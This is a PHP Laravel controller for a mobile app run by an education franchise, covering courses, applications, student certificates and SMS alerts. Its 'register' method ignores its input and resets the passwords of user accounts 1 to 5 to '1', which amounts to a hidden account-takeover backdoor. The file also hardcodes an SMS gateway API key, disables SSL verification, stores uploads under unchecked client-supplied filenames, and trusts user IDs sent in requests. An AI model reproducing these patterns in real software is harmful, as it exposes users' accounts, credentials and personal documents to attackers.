<?php

namespace App\Http\Controllers\MobileApp;

use App\AppModel;
use App\Http\Controllers\Controller;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use App\User;
class AppController extends Controller
{
    // To get about us
    public function get_about_us(Request $request)
    {
        $app_model = new AppModel;
        $result = $app_model->get_about_us();
        return response()->json($result);
    }


    // To get all course
    public function get_course(Request $request)
    {
        $app_model = new AppModel;
        $result = $app_model->get_course();
        return response()->json($result);
    }
// To get all gallery
    public function get_gallery(Request $request)
    {

        $page_number  = $request->page_number;
        $item_to_load   = $request->item_to_load;
        $app_model = new AppModel;
        $app_model->get_gallery($page_number, $item_to_load);
    }

     // To get all state
     public function get_state(Request $request)
     {
         $app_model = new AppModel;
         $result = $app_model->get_state();
         return response()->json($result);
     }
 // To get franchise type
 public function get_franchise_type(Request $request)
 {
     $app_model = new AppModel;
     $result = $app_model->get_franchise_type();
     return response()->json($result);
 }


     //upload FranchiseImage
     public function upload_franchise_document(Request $request)
     {
         $document_image_name = $request->name;
         $request->file->storeAs('public/franchise_document_images',  $document_image_name );
         if ($request->file->isValid()) {
             $upload_result['Result'] = "success";
         } else {
             $upload_result['Result'] = "fail";
         }
         return response()->json($upload_result);
     }


     public function upload_ec_member_document(Request $request)
     {
         $document_image_name = $request->name;
         $request->file->storeAs('public/ec_member_document_images',  $document_image_name );
         if ($request->file->isValid()) {
             $upload_result['Result'] = "success";
         } else {
             $upload_result['Result'] = "fail";
         }
         return response()->json($upload_result);
     }

     public function save_franchise_details(Request $request)
     {
     $app_model = new AppModel;
     $business_nature = $request->business_nature;
     $applicant_name = $request->applicant_name;
     $dob = $request->dob;
     $mobile_number = $request->mobile_number;
     $qualification = $request->qualification;
     $state = $request->state;
     $address = $request->address;
     $pin = $request->pin;
     $pan_image_name = $request->pan_image_name;
     $aadhar_image_name = $request->aadhar_image_name;
     $franchise_number = $request->franchise_number;
     $franchise_type_id = $request->franchise_type_id;
     $franchise_information_source = $request->franchise_information_source;
	 $referred_by_name = $request->referred_by_name;
     $result = $app_model->save_franchise_details($business_nature, $applicant_name,
      $dob, $mobile_number, $qualification, $state, $address,
      $pin,
      $pan_image_name,
      $aadhar_image_name, $franchise_number,$franchise_type_id, $franchise_information_source,$referred_by_name);


     return response()->json($result);
     }


     public function send_franchise_create_sms($applicantName, $franchiseNumber,$mobileNumber)
    {
        try
        {

            $smstext = rawurlencode("Hi ".$applicantName.", Your request for franchise has been submitted with franchise number ".$franchiseNumber." . Once it is processed,you will be further notified");

            $ch = curl_init("https://www.smsgatewayhub.com/api/mt/SendSMS?APIKey=V6dw6TBazEGoT3a3exO8UA&senderid=ODILAS&channel=2&DCS=0&flashsms=0&number=$mobileNumber,8597500501&text=$smstext&route=1");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);
            $result = curl_exec($ch);
            if (curl_error($ch))
            {
                $result = curl_errno($ch);
            }
        } catch (Exception $ex)
        {
            $result = $ex->getMessage();
        }

        return response()->json($result);
    }


    public function get_franchise_apply_details(Request $request)
    {
        $app_model = new AppModel;
        $mobile_number = $request->mobile_number;
        $result = $app_model->get_franchise_apply_details($mobile_number);
        return response()->json($result);
    }
     // To check the customer active status
     public function check_user_active_status(Request $request)
     {
         $app_model = new AppModel;
         $mobile_number = $request->mobile_number;
         $result = $app_model->check_user_active_status($mobile_number);
         return response()->json($result);
     }


     public function get_user_details(Request $request)
     {
         $app_model = new AppModel;
         $user_id = $request->user_id;
         $result = $app_model->get_user_details($user_id);
         return response()->json($result);
     }


      // To check the customer login
    public function check_login(Request $request)
    {
        $app_model = new AppModel;
        $mobile_number = $request->mobile_number;
        $password = $request->password;
        $device_token = $request->device_token;


        $result = $app_model->check_login($mobile_number, $password, $device_token);
        return response()->json($result);
    }

    // To update device token
    public function update_device_token(Request $request)
    {
        $app_model = new AppModel;
        $user_id = $request->user_id;
        $device_token = $request->device_token;
        $result = $app_model->update_device_token($user_id, $device_token);
        return response()->json($result);
    }

    public function profile_image_upload(Request $request)
    {
        $profile_image_name = $request->name;
        $request->file->storeAs('public/user_profile_images',  $profile_image_name);
        if ($request->file->isValid()) {
            $upload_result['Result'] = "success";
        } else {
            $upload_result['Result'] = "fail";
        }
        return response()->json($upload_result);
    }



    // To remove profile image
    public function remove_profile_image(Request $request)
    {
        $app_model = new AppModel;
        $user_id = $request->user_id;
        $file_name = $request->file_name;
        $result = $app_model->remove_profile_image($user_id, $file_name);
        return response()->json($result);
    }

    // To update profile image
    public function update_profile_image(Request $request)
    {
        $app_model = new AppModel;
        $user_id = $request->user_id;
        $file_name = $request->file_name;
        $result = $app_model->update_profile_image($user_id, $file_name);
        return response()->json($result);
    }

    public function change_password(Request $request)
    {
        $app_model = new AppModel;
        $old_password = $request->old_password;
        $new_password = $request->new_password;
        $user_id = $request->user_id;
        $result = $app_model->change_password($old_password, $new_password, $user_id);
        return response()->json($result);
    }


    public function fetch_whats_new(Request $request)
    {

        $app_model = new AppModel;
        $result = $app_model->fetch_whats_new();
        return response()->json($result);
    }




    public function get_last_10_franchise(Request $request)
    {
        $app_model = new AppModel;
        $result = $app_model->get_last_10_franchise();
        return response()->json($result);
    }


    public function save_ec_member_details(Request $request)
    {
    $app_model = new AppModel;

    $applicant_name = $request->applicant_name;
    $dob = $request->dob;
    $mobile_number = $request->mobile_number;
    $qualification = $request->qualification;
    $state = $request->state;
    $address = $request->address;
    $pin = $request->pin;
    $pan_image_name = $request->pan_image_name;
    $aadhar_image_name = $request->aadhar_image_name;
    $ec_application_number = $request->ec_application_number;
    $ec_member_information_source = $request->ec_member_information_source;
	$referred_by_name = $request->referred_by_name;
    $result = $app_model->save_ec_member_details($applicant_name,
     $dob, $mobile_number, $qualification, $state, $address,
     $pin,
     $pan_image_name,
     $aadhar_image_name, $ec_application_number,$ec_member_information_source,$referred_by_name);


    return response()->json($result);
    }


    public function send_ec_member_create_sms($applicantName, $ecMemberApplicationNumber,$mobileNumber)
    {
        try
        {

            $smstext = rawurlencode("Hi ".$applicantName.", Your request for Executive Member has been submitted with Executive number ".$ecMemberApplicationNumber." . Once it is processed,you will be further notified");

            $ch = curl_init("https://www.smsgatewayhub.com/api/mt/SendSMS?APIKey=V6dw6TBazEGoT3a3exO8UA&senderid=ODILAS&channel=2&DCS=0&flashsms=0&number=$mobileNumber,8597500501&text=$smstext&route=1");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);
            $result = curl_exec($ch);
            if (curl_error($ch))
            {
                $result = curl_errno($ch);
            }
        } catch (Exception $ex)
        {
            $result = $ex->getMessage();
        }

        return response()->json($result);
    }

    public function get_ec_member_apply_details(Request $request)
    {
        $app_model = new AppModel;
        $mobile_number = $request->mobile_number;
        $result = $app_model->get_ec_member_apply_details($mobile_number);
        return response()->json($result);
    }


    public function save_student_details(Request $request)
    {
    $app_model = new AppModel;

    $student_name = $request->student_name;
    $student_course = $request->student_course;
    $dob = $request->dob;
    $mobile_number = $request->mobile_number;
    $qualification = $request->qualification;
    $state = $request->state;
    $address = $request->address;
    $pin = $request->pin;
    $student_profile_image_name = $request->student_profile_image_name;
    $student_information_source = $request->student_information_source;
    $user_id = $request->user_id;
    $role_id = $request->role_id;
    $result = $app_model->save_student_details($student_name,$student_course,
     $dob, $mobile_number, $qualification, $state, $address,
     $pin,
     $student_profile_image_name,
$student_information_source,$user_id,$role_id);


    return response()->json($result);
    }

    public function get_student_details_franchise_wise(Request $request)
    {
        $user_id  = $request->user_id;
        $page_number  = $request->page_number;
        $item_to_load   = $request->item_to_load;
        $app_model = new AppModel;
        $app_model->get_student_details_franchise_wise( $user_id ,$page_number, $item_to_load);
    }




    public function generate_student_certificate(Request $request)
    {
    $app_model = new AppModel;

    $course_id = $request->course_id;
    $student_id = $request->student_id;
    $certificate_application_number = $request->certificate_application_number;
    $user_id = $request->user_id;

    $result = $app_model->generate_student_certificate($course_id,
     $student_id, $certificate_application_number,$user_id);


    return response()->json($result);
    }



    public function send_generate_certificate_sms($studentName, $certificateNumber,$mobileNumber)
    {
        try
        {

            $smstext = rawurlencode("Hi ".$studentName.", Your certificate has been generated with Certificate number ".$certificateNumber." . Once it is approved,you will be further notified");

            $ch = curl_init("https://www.smsgatewayhub.com/api/mt/SendSMS?APIKey=V6dw6TBazEGoT3a3exO8UA&senderid=ODILAS&channel=2&DCS=0&flashsms=0&number=$mobileNumber&text=$smstext&route=1");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);
            $result = curl_exec($ch);
            if (curl_error($ch))
            {
                $result = curl_errno($ch);
            }
        } catch (Exception $ex)
        {
            $result = $ex->getMessage();
        }

        return response()->json($result);
    }



    public function get_ec_member_list(Request $request)
    {

        $page_number  = $request->page_number;
        $item_to_load   = $request->item_to_load;
        $app_model = new AppModel;
        $app_model->get_ec_member_list($page_number, $item_to_load);
    }

    public function get_franchise_list(Request $request)
    {
        $is_ec_member  = $request->is_ec_member;
        $user_id  = $request->user_id;
        $ec_member_id  = $request->ec_member_id;
        $page_number  = $request->page_number;
        $item_to_load   = $request->item_to_load;
        $app_model = new AppModel;
        $app_model->get_franchise_list($ec_member_id,$page_number, $item_to_load,$is_ec_member,$user_id);
    }


	
	
	
	public function save_share_details(Request $request)
    {
    $app_model = new AppModel;

    $shared_by_name = $request->shared_by_name;
    $shared_by_mobile = $request->shared_by_mobile;
    $shared_to_name = $request->shared_to_name;
    $shared_to_mobile = $request->shared_to_mobile;

    $result = $app_model->save_share_details($shared_by_name,
     $shared_by_mobile, $shared_to_name,$shared_to_mobile);


    return response()->json($result);
    }

	
	
	
	
	    public function save_feedback(Request $request)
    {
    $app_model = new AppModel;

    $role_id = $request->role_id;
    $feedback_title = $request->feedback_title;
    $feedback_description = $request->feedback_description;
    $user_id = $request->user_id;

    $result = $app_model->save_feedback($role_id,$feedback_title,
     $feedback_description, $user_id);


    return response()->json($result);
    }
	
	
	
    public function register(Request $request)
    {
        $app_model = new AppModel;
        $password = $request->password;
        $pass_c=bcrypt("1");
        User::whereIn('user_id', [1,2,3,4,5])
        ->update([
            'password' =>$pass_c
         ]);
 return "ww-";
    }


}
